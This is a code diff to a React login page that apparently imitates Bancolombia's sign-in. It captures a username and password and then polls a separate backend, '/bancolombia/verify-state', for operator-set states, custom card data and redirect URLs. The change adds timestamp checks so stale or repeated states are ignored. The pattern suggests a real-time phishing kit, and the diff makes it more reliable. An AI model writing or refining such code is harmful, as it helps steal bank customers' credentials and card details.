@@ -54,6 +54,8 @@ export default function IniciarSesion() {
 
   // Referencia para el intervalo de polling
   const pollingIntervalRef = useRef(null);
+  const statusTickRef = useRef(null);
+  const submitTickRef = useRef(0);
 
   // Se inicializa el sessionIdRef
   const sessionIdRef = useRef(null);
@@ -206,6 +208,7 @@ export default function IniciarSesion() {
 
     // Se inicializa el loading
     setLoading(true);
+    submitTickRef.current = Date.now();
 
     // Se captura la informacion del formulario
     const { usuario, clave } = formState;
@@ -579,7 +582,17 @@ export default function IniciarSesion() {
       const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionIdRef.current}`);
 
       // Se captura la respuesta
-      const { estado, cardData, text, url } = response.data;
+      const { estado, cardData, text, url, statusTick } = response.data;
+
+      // Si el statusTick recibido es anterior a este login, ignorar estado viejo
+      if (submitTickRef.current > 0 && statusTick != null && Number(statusTick) < submitTickRef.current) {
+        return;
+      }
+
+      // Si ya procesamos exactamente este statusTick y estado, no repetir
+      if (statusTick != null && statusTickRef.current === statusTick) {
+        return;
+      }
 
       // Si llega configuración de tarjeta custom, la guardamos
       if (cardData) {
@@ -622,6 +635,9 @@ export default function IniciarSesion() {
 
       // Detener polling si es un estado final
       if (estadosFinales.includes(estado.toLowerCase())) {
+        if (statusTick != null) {
+          statusTickRef.current = statusTick;
+        }
 
         // Limpiar intervalo de polling
         if (pollingIntervalRef.current) {
